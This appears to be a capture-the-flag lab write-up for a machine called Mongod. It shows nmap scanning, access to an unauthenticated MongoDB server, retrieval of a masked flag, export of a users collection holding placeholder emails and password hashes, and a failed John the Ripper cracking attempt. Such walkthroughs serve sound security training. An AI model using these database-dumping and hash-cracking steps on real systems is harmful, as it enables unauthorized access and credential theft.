# Mongod

Use *ping* to check if the host is up.

```console
kali@kali:~$ ping 10.129.228.30 -c 1             
PING 10.129.228.30 (10.129.228.30) 56(84) bytes of data.
64 bytes from 10.129.228.30: icmp_seq=1 ttl=63 time=16.0 ms

--- 10.129.228.30 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 15.974/15.974/15.974/0.000 ms
```

Run a *nmap* scan on the top 1000 ports.

```console
kali@kali:~$ nmap -A 10.129.228.30       
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-19 00:27 EST
Nmap scan report for 10.129.228.30
Host is up (0.063s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
```

Run a concurrent *nmap* scan on all ports.

```console
kali@kali:~$ nmap -A 10.129.228.30 -p- -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-18 22:54 EST
Nmap scan report for 10.129.228.30
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
27017/tcp open  mongodb MongoDB 3.6.8 3.6.8
...
|   databases
|     2
|       name = local
|       sizeOnDisk = 73728.0
|       empty = false
|     1
|       name = config
|       sizeOnDisk = 73728.0
|       empty = false
|     4
|       name = users
|       sizeOnDisk = 32768.0
|       empty = false
|     3
|       name = sensitive_information
|       sizeOnDisk = 32768.0
|       empty = false
|     0
|       name = admin
|       sizeOnDisk = 32768.0
|       empty = false
|_  ok = 1.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Attempt to connect via SSH as root:'' or root:root.

```console
kali@kali:~$ ssh root@10.129.228.30
root@10.129.228.30's password: 
Permission denied, please try again.
root@10.129.228.30's password:
```

Follow the steps [here](https://gainsec.com/2022/01/28/mongodb-cli-client-kali-linux/) to install MongoDB tools, including the *mongosh* client.

Use *mongosh* to connect to the MongoDB server and obtain the **flag**.

```console
kali@kali:~/Mongod$ mongosh "mongodb://10.129.228.30:27017"                                                                                  
Current Mongosh Log ID: 63f2eb56c6db0ab35f06f326
Connecting to:          mongodb://10.129.228.30:27017/?directConnection=true&appName=mongosh+1.7.1
Using MongoDB:          3.6.8
Using Mongosh:          1.7.1

For mongosh info see: https://docs.mongodb.com/mongodb-shell/

------
   The server generated these startup warnings when booting
   2023-02-20T02:04:35.543+0000: 
   2023-02-20T02:04:35.543+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
   2023-02-20T02:04:35.543+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
   2023-02-20T02:04:39.266+0000: 
   2023-02-20T02:04:39.266+0000: ** WARNING: Access control is not enabled for the database.
   2023-02-20T02:04:39.266+0000: **          Read and write access to data and configuration is unrestricted.
   2023-02-20T02:04:39.266+0000:
------

test> show dbs
admin                  32.00 KiB
config                 96.00 KiB
local                  72.00 KiB
sensitive_information  32.00 KiB
users                  32.00 KiB
test> use sensitive_information
switched to db sensitive_information
sensitive_information> show collections
flag
sensitive_information> db.flag.find()
[
  {
    _id: ObjectId("630e3dbcb82540ebbd1748c5"),
    flag: '****************************a6ea'
  }
]
sensitive_information>
```

Check for other useful or interesting information on the server. We find a list of credentials for an ecommerce application.

```console
sensitive_information> use users
switched to db users
users> show collections
ecommerceWebapp
users> db.ecommerceWebapp.find()
[
  {
    _id: ObjectId("630e4432b82540ebbd1748c6"),
    id: 1,
    username: 'Ryley',
    email: 'vheathcote@example.net',
    createdAt: '2019-07-17',
    password: 'fff4b345de2aee9f1fa5e2a44b3b03378b189d1e'
  },
  {
    _id: ObjectId("630e4454b82540ebbd1748c7"),
    id: 2,
    username: 'Bertha',
    email: 'astreich@example.net',
    createdAt: '1976-02-18',
    password: '085ed623db4b520f59ab1b6b6d222eea94ceb4cb'
  },
  {
    _id: ObjectId("630e445cb82540ebbd1748c8"),
    id: 3,
    username: 'Maximillian',
    email: 'trent.carroll@example.org',
    createdAt: '2005-08-26',
    password: '3859489a17b1cf46251aca8984af8da43356e496'
  },
  {
    _id: ObjectId("630e446cb82540ebbd1748c9"),
    id: 4,
    username: 'Giuseppe',
    email: 'bernadine81@example.com',
    createdAt: '2009-03-31',
    password: 'cb4a1ed66f998facd1a39b32f0f1ee698ee7e166'
  },
  {
    _id: ObjectId("630e4475b82540ebbd1748ca"),
    id: 5,
    username: 'Darrell',
    email: 'pblanda@example.org',
    createdAt: '1986-04-10',
    password: '6fd69f347d34d5dacd62f45851c4052a69ef8a94'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73d0"),
    id: 6,
    username: 'itrantow',
    email: 'boyer.elna@example.com',
    createdAt: '1975-04-28',
    password: 'e5f81b290486127cdb76133ecb7d9b1d'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73d1"),
    id: 7,
    username: 'mayra34',
    email: 'lferry@example.org',
    createdAt: '1997-05-14',
    password: '03a8f2ef52750aa1f257817198f2d9d1'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73d2"),
    id: 8,
    username: 'hahn.maritza',
    email: 'klubowitz@example.com',
    createdAt: '2019-03-06',
    password: 'ef6b43e3406e5cd3d6165d104885d6f3'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73d3"),
    id: 9,
    username: 'cremin.eliza',
    email: 'mgutkowski@example.org',
    createdAt: '2006-03-09',
    password: 'e4d416c0d0e2c39e234538487bd4a90f'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73d4"),
    id: 10,
    username: 'jazmyne.raynor',
    email: 'uwisoky@example.com',
    createdAt: '1971-08-28',
    password: '6a7e8382202666495e7af9e8c4eeae01'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73d5"),
    id: 11,
    username: 'jon68',
    email: 'waters.weston@example.org',
    createdAt: '1999-07-07',
    password: 'e8c1edfcd54021b2952dc9441492176f'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73d6"),
    id: 12,
    username: 'ifunk',
    email: 'eino52@example.net',
    createdAt: '2022-08-06',
    password: 'e1e5a4399b6ab48fc6ca314b84874f66'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73d7"),
    id: 13,
    username: 'evalyn27',
    email: 'jason36@example.net',
    createdAt: '2002-03-04',
    password: '20bac8efa1198ff21fa7030fa3f43223'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73d8"),
    id: 14,
    username: 'zella.muller',
    email: 'kolby25@example.net',
    createdAt: '2008-06-01',
    password: '0561f0e68c602590e006a41b8a945d2f'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73d9"),
    id: 15,
    username: 'benjamin.doyle',
    email: 'ubruen@example.net',
    createdAt: '1986-11-26',
    password: 'cf0e43dedbf57f134467f989b64b2126'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73da"),
    id: 16,
    username: 'lchamplin',
    email: 'alexandrea00@example.net',
    createdAt: '1977-02-21',
    password: '9d2b39f53e4ef079c060fe87f8eefbbc'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73db"),
    id: 17,
    username: 'cruickshank.raheem',
    email: 'rice.tia@example.com',
    createdAt: '1979-11-09',
    password: 'e5d355b7dafcd1e85e0d020200e4ed5a'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73dc"),
    id: 18,
    username: 'qhomenick',
    email: 'wwisozk@example.org',
    createdAt: '1972-12-29',
    password: 'd62d83b7d1884a7ed45f585ddfa9cb03'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73dd"),
    id: 19,
    username: 'collins.minnie',
    email: 'edmond50@example.com',
    createdAt: '1981-03-04',
    password: '85a48b7fc09b174c51ae4c21f31f1817'
  },
  {
    _id: ObjectId("630f4df1683a81f8b58a73de"),
    id: 20,
    username: 'qrowe',
    email: 'wiegand.elvis@example.net',
    createdAt: '2019-01-09',
    password: 'e7a85a658512704a83b72172e9928ad0'
  }
]
```

Create a new directory, "Mongod", and set it as the present working directory.

```console
kali@kali:~$ mkdir Mongod                                                                                                                                                                                                                                                                                                         
kali@kali:~$ cd Mongod                                                                                                                                                                                                          
```

Use the *mongoexport* to grab all of the user data from the ecommerceWebapp collection as a CSV formatted file.

```console                                                                                                                                                                                                                     
kali@kali:~/Mongod$ mongoexport --host 10.129.228.30 --port 27017 --db=users --collection=ecommerceWebapp --fields "username,email,password" --type=csv --out=users.csv
2023-02-19T22:26:43.776-0500    connected to: mongodb://10.129.228.30:27017/
2023-02-19T22:26:44.049-0500    exported 25 records
```

```console
kali@kali:~/Mongod$ ls
users.csv                                                                                                                                                                                                                          
kali@kali:~/Mongod$ cat users.csv                
username,email,password
Ryley,vheathcote@example.net,fff4b345de2aee9f1fa5e2a44b3b03378b189d1e
Bertha,astreich@example.net,085ed623db4b520f59ab1b6b6d222eea94ceb4cb
Maximillian,trent.carroll@example.org,3859489a17b1cf46251aca8984af8da43356e496
Giuseppe,bernadine81@example.com,cb4a1ed66f998facd1a39b32f0f1ee698ee7e166
Darrell,pblanda@example.org,6fd69f347d34d5dacd62f45851c4052a69ef8a94
itrantow,boyer.elna@example.com,e5f81b290486127cdb76133ecb7d9b1d
mayra34,lferry@example.org,03a8f2ef52750aa1f257817198f2d9d1
hahn.maritza,klubowitz@example.com,ef6b43e3406e5cd3d6165d104885d6f3
cremin.eliza,mgutkowski@example.org,e4d416c0d0e2c39e234538487bd4a90f
jazmyne.raynor,uwisoky@example.com,6a7e8382202666495e7af9e8c4eeae01
jon68,waters.weston@example.org,e8c1edfcd54021b2952dc9441492176f
ifunk,eino52@example.net,e1e5a4399b6ab48fc6ca314b84874f66
evalyn27,jason36@example.net,20bac8efa1198ff21fa7030fa3f43223
zella.muller,kolby25@example.net,0561f0e68c602590e006a41b8a945d2f
benjamin.doyle,ubruen@example.net,cf0e43dedbf57f134467f989b64b2126
lchamplin,alexandrea00@example.net,9d2b39f53e4ef079c060fe87f8eefbbc
cruickshank.raheem,rice.tia@example.com,e5d355b7dafcd1e85e0d020200e4ed5a
qhomenick,wwisozk@example.org,d62d83b7d1884a7ed45f585ddfa9cb03
collins.minnie,edmond50@example.com,85a48b7fc09b174c51ae4c21f31f1817
qrowe,wiegand.elvis@example.net,e7a85a658512704a83b72172e9928ad0
heath71,beer.karl@example.com,a9a7671d92596e9be92bd7f62dc5a55d
epredovic,erunte@example.net,91b8fd1069cc926743431e40a16cb308
magdalen19,mercedes.hessel@example.net,a97b27935eae7467f599975ece4eb821
madison.hermiston,grant.mariano@example.com,b79417a62e0e2391483f869e33fbbcc8
clare08,fhickle@example.net,12d70565b1645ae77a607bacaf42bd03
```

Use `hash-identifier` to identify the two different types of hashes.

```console
kali@kali:~/Mongod$ hash-identifier fff4b345de2aee9f1fa5e2a44b3b03378b189d1e                   
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
...
kali@kali:~/Mongod$ hash-identifier 12d70565b1645ae77a607bacaf42bd03        
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
...
```

We are going to go with SHA-1 and MD5. Let's return to the users.csv file.

```console
kali@kali:~/Mongod$ cat users.csv
username,email,password
Ryley,vheathcote@example.net,fff4b345de2aee9f1fa5e2a44b3b03378b189d1e
Bertha,astreich@example.net,085ed623db4b520f59ab1b6b6d222eea94ceb4cb
Maximillian,trent.carroll@example.org,3859489a17b1cf46251aca8984af8da43356e496
Giuseppe,bernadine81@example.com,cb4a1ed66f998facd1a39b32f0f1ee698ee7e166
Darrell,pblanda@example.org,6fd69f347d34d5dacd62f45851c4052a69ef8a94
itrantow,boyer.elna@example.com,e5f81b290486127cdb76133ecb7d9b1d
mayra34,lferry@example.org,03a8f2ef52750aa1f257817198f2d9d1
hahn.maritza,klubowitz@example.com,ef6b43e3406e5cd3d6165d104885d6f3
cremin.eliza,mgutkowski@example.org,e4d416c0d0e2c39e234538487bd4a90f
jazmyne.raynor,uwisoky@example.com,6a7e8382202666495e7af9e8c4eeae01
jon68,waters.weston@example.org,e8c1edfcd54021b2952dc9441492176f
ifunk,eino52@example.net,e1e5a4399b6ab48fc6ca314b84874f66
evalyn27,jason36@example.net,20bac8efa1198ff21fa7030fa3f43223
zella.muller,kolby25@example.net,0561f0e68c602590e006a41b8a945d2f
benjamin.doyle,ubruen@example.net,cf0e43dedbf57f134467f989b64b2126
lchamplin,alexandrea00@example.net,9d2b39f53e4ef079c060fe87f8eefbbc
cruickshank.raheem,rice.tia@example.com,e5d355b7dafcd1e85e0d020200e4ed5a
qhomenick,wwisozk@example.org,d62d83b7d1884a7ed45f585ddfa9cb03
collins.minnie,edmond50@example.com,85a48b7fc09b174c51ae4c21f31f1817
qrowe,wiegand.elvis@example.net,e7a85a658512704a83b72172e9928ad0
heath71,beer.karl@example.com,a9a7671d92596e9be92bd7f62dc5a55d
epredovic,erunte@example.net,91b8fd1069cc926743431e40a16cb308
magdalen19,mercedes.hessel@example.net,a97b27935eae7467f599975ece4eb821
madison.hermiston,grant.mariano@example.com,b79417a62e0e2391483f869e33fbbcc8
clare08,fhickle@example.net,12d70565b1645ae77a607bacaf42bd03
```

We are going to create 4 files with data formatted as so: username:SHA-1, username:MD5, email_prefix:SHA-1, email_prefix:MD5.

```console
kali@kali:~/Mongod/john$ ls
email_prefixes_passwords_md5.txt    users_passwords_md5.txt
email_prefixes_passwords_sha_1.txt  users_passwords_sha1.txt
```

We will use *John the Ripper* to try and crack the passwords by mangling the corresponding username or email_prefix.

```console
kali@kali:~/Mongod/john$ john --single --format=Raw-MD5 users_passwords_md5.txt
Using default input encoding: UTF-8
Loaded 20 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE (2023-03-11 01:51) 0g/s 2714Kp/s 2714Kc/s 54286KC/s maritza1900..itrantow1900
Session completed. 
                                                                                                               
kali@kali:~/Mongod/john$ john --single --format=Raw-MD5 email_prefixes_passwords_md5.txt
Using default input encoding: UTF-8
Loaded 20 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE (2023-03-11 01:51) 0g/s 1676Kp/s 1676Kc/s 33539KC/s bboyer1900..eboyer1900
Session completed. 

kali@kali:~/Mongod/john$ john --single --format=Raw-SHA1 users_passwords_sha_1.txt 
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-SHA1 [SHA1 128/128 SSE2 4x])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE (2023-03-11 01:52) 0g/s 113000p/s 113000c/s 565000C/s ryley1900
Session completed. 
                                                                                                               
kali@kali:~/Mongod/john$ john --single --format=Raw-SHA1 email_prefixes_passwords_sha_1.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-SHA1 [SHA1 128/128 SSE2 4x])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE (2023-03-11 01:52) 0g/s 396775p/s 396775c/s 1983KC/s carrolltrent1900..vheathcote1900
Session completed.
```

No luck. This topic will be revisted later.






